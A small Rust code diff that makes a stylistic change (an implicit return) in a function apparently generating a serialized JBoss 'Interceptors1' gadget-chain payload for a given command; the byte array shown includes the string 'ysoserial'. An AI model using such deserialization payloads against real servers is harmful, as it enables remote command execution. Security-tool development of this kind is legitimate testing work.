@@ -145,5 +145,5 @@ pub fn get_jboss_interceptors1(cmd: &str) -> Vec<u8> {
         119, 8, 0, 0, 0, 16, 0, 0, 0, 1, 116, 0, 9, 121, 115, 111, 115, 101, 114, 105, 97, 108,
         113, 0, 126, 0, 79, 120, 120,
     ]);
-    return result_bytes;
+    result_bytes
 }
